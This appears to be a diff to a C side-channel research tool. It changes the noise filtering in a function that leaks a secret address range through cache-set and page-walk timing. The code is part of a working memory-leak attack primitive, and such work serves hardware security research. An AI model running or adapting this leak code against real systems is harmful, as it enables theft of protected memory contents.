@@ -221,21 +221,13 @@ struct bit_map* leak_addr_range(uint64_t start_leak, uint64_t end_leak, uint64_t
     uint64_t previous_set = 64;
     for(uint64_t cur_addr = end_leak - 1; cur_addr >= start_leak; cur_addr -= gran) {
 
-        // TODO wtf is the advanced noise filter .... and is this even needed .... 
         // Calculate possible noise from the PO of the secret's address and mask them out 
-        // with the noise filter. There is additional filtering to be more cautious. 
+        // with the noise filter. There is additional filtering to account potential prefetching
+        // and just to be extra cautious. 
         int PO = cur_addr % 4096; 
-        int mid = (PO / 64) % ncache_lines;  // TODO enable this advanced filter via flag! 
-        int advanced_filter[3] = {ncache_lines}; 
-        int adv_idx = 0; 
-        for(int to_check = mid - 1; to_check <= mid + 1; to_check++)
-            if( (64 * to_check - 7) <= PO && PO <= (64 * (to_check + 1)) ) // TODO wtf is this .... 
-                advanced_filter[adv_idx++] = to_check;
-        for(int i = 0; i < adv_idx; i++) {
-            if(i != 0) init_noise_filter[advanced_filter[i] - 1] += 2; 
-            init_noise_filter[advanced_filter[i]] += 2; 
-            if(i != 63) init_noise_filter[advanced_filter[i] + 1] += 2; 
-        }
+        int PO_set = (PO / 64) % ncache_lines;
+        init_noise_filter[PO_set] += 2; 
+        init_noise_filter[(PO_set + 1) % ncache_lines] += 2;
 
         // Retrive secret 
         struct pwsc_ans ans = {
@@ -266,12 +258,9 @@ struct bit_map* leak_addr_range(uint64_t start_leak, uint64_t end_leak, uint64_t
         // Update previous set
         previous_set = VPN4_TO_CACHE_LINE((ans.va.va<<8));  
 
-        // Clear advanced noise filter (TODO this might not be needed)
-        for(int i = 0; i < adv_idx; i++) {
-            if(i != 0) init_noise_filter[advanced_filter[i] - 1] -= 2; 
-            init_noise_filter[advanced_filter[i]] -= 2; 
-            if(i != 63) init_noise_filter[advanced_filter[i] + 1] -= 2; 
-        }
+        // Clear advanced noise filter 
+        init_noise_filter[PO_set] -= 2; 
+        init_noise_filter[(PO_set + 1) % ncache_lines] -= 2;
     }
     
     return ret; 
